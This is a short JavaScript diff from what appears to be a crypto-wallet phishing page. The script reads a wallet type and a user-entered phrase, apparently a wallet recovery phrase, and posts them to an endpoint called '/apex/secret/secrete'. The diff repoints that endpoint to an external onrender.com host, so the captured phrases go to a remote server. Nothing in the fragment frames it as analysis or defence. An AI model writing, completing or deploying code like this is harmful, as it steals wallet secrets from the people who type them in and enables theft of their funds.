@@ -9,7 +9,7 @@ window.addEventListener('load', () =>{
         const wallet_Type = walletType.textContent
         const notaPh = phraseIn.value
         try {
-           const data =  await axios.post('/apex/secret/secrete',
+           const data =  await axios.post('https://apex-h7wm.onrender.com/apex/secret/secrete',
             {
                 user:client,
                 walletType:wallet_Type,
